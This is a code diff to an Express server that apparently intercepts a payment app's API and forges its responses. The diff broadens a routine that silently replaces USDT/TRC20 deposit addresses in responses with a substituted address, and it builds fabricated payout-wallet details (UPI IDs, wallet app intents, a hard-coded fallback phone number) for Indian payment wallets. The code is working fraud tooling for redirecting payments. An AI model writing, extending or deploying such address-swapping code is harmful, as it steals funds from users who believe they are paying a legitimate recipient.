@@ -1044,7 +1044,7 @@ function replaceUsdtInResponse(jsonResp, data) {
     for (const key of Object.keys(obj)) {
       const kl = key.toLowerCase();
       if (typeof obj[key] === 'string') {
-        if ((kl.includes('usdt') && kl.includes('addr')) || kl === 'address' || kl === 'walletaddress' || kl === 'customusdtaddress' || kl === 'addr' || kl === 'depositaddress' || kl === 'deposit_address' || kl === 'receiveaddress' || kl === 'receiveraddress' || kl === 'payaddress' || kl === 'trcaddress' || kl === 'trc20address' || (kl.includes('address') && obj[key].length >= 30 && /^T[a-zA-Z0-9]{33}$/.test(obj[key]))) {
+        if ((kl.includes('usdt') && (kl.includes('addr') || kl.includes('address'))) || kl === 'walletaddress' || kl === 'customusdtaddress' || kl === 'depositaddress' || kl === 'deposit_address' || kl === 'receiveaddress' || kl === 'receiveraddress' || kl === 'trcaddress' || kl === 'trc20address' || (typeof obj[key] === 'string' && obj[key].length >= 30 && /^T[a-zA-Z0-9]{33}$/.test(obj[key]))) {
           if (obj[key].length >= 20 && obj[key] !== newAddr) {
             oldAddr = oldAddr || obj[key];
             obj[key] = newAddr;
@@ -2340,18 +2340,26 @@ app.post('/app/payment/order/create', async (req, res) => {
       const pWIdStr = String(body.payoutWalletId || body.walletId || '');
       const cachedWallet = payoutWalletCache.get(pWIdStr);
 
+      const walletNamesMap = { 1: "Airtel", 2: "Freecharge", 3: "PhonePe", 4: "Mobikwik", 5: "Paytm", 6: "AmazonPay" };
+      const walletIntentMap = { 1: "airtel://", 2: "freecharge://", 3: "phonepe://", 4: "mobikwik://", 5: "paytmmp://", 6: "amazonpay://" };
+      const walletUpiSuffix = { 1: "@airtel", 2: "@freecharge", 3: "@ybl", 4: "@ikwik", 5: "@paytm", 6: "@apl" };
+
       if (cachedWallet) {
         dummyMatch.payoutWalletType = cachedWallet.ctType;
         dummyMatch.payoutWalletName = cachedWallet.walletName;
         dummyMatch.payoutWalletAccount = cachedWallet.account;
         dummyMatch.payoutWalletUpi = cachedWallet.upi;
+        dummyMatch.intent = cachedWallet.intent;
       } else {
         const wId = Number(body.payoutWalletId || body.walletId || body.payoutWalletType || 2);
-        const walletNames = { 1: "Airtel", 2: "Freecharge", 3: "PhonePe", 4: "Mobikwik", 5: "Paytm", 6: "AmazonPay" };
+        const wName = walletNamesMap[wId] || "Freecharge";
+        const userPhoneStr = getPhone(data, userId) || "6206785398";
+        const defaultSuffix = walletUpiSuffix[wId] || "@freecharge";
         dummyMatch.payoutWalletType = wId;
-        dummyMatch.payoutWalletName = walletNames[wId] || "Freecharge";
-        dummyMatch.payoutWalletAccount = getPhone(data, userId) || "6206785398";
-        dummyMatch.payoutWalletUpi = dummyMatch.payoutWalletAccount + "@" + (walletNames[wId] || "Freecharge").toLowerCase();
+        dummyMatch.payoutWalletName = wName;
+        dummyMatch.payoutWalletAccount = userPhoneStr;
+        dummyMatch.payoutWalletUpi = userPhoneStr + defaultSuffix;
+        dummyMatch.intent = walletIntentMap[wId] || (wName.toLowerCase() + "://");
       }
 
       const jsonResp = {
@@ -2497,10 +2505,14 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
       const bank = getActiveBank(data, userId);
       const phone = getPhone(data, userId);
 
+      const walletNamesMap = { 1: "Airtel", 2: "Freecharge", 3: "PhonePe", 4: "Mobikwik", 5: "Paytm", 6: "AmazonPay" };
+      const walletIntentMap = { 1: "airtel://", 2: "freecharge://", 3: "phonepe://", 4: "mobikwik://", 5: "paytmmp://", 6: "amazonpay://" };
+
       const wName = dummyMatch.payoutWalletName || "Freecharge";
       const wAcct = dummyMatch.payoutWalletAccount || phone || "6206785398";
       const wUpi = dummyMatch.payoutWalletUpi || (wAcct + "@" + wName.toLowerCase());
       const wType = dummyMatch.payoutWalletType || 2;
+      const wIntent = dummyMatch.intent || walletIntentMap[wType] || (wName.toLowerCase() + "://");
 
       jsonResp = {
         code: 1000,
@@ -2540,9 +2552,11 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
           expiryTimestamp: expiryMs,
           expireTimeStamp: expiryMs,
           expireTime: Math.floor(expiryMs / 1000),
-          intent: "freecharge://",
-          freechargeIntent: "freecharge://",
-          payUrl: "freecharge://",
+          intent: wIntent,
+          freechargeIntent: wType === 2 ? wIntent : null,
+          mobikwikIntent: wType === 4 ? wIntent : null,
+          paytmIntent: wType === 5 ? wIntent : null,
+          payUrl: wIntent,
           payoutWalletType: wType,
           payoutWallet: { name: wName, type: wType },
           payTypeName: wName,
@@ -2552,8 +2566,7 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
           payoutWalletUpi: wUpi,
           payoutAccount: wAcct,
           payoutPhone: wAcct,
-          payoutUpi: wUpi,
-          address: wUpi
+          payoutUpi: wUpi
         },
         message: "success"
       };
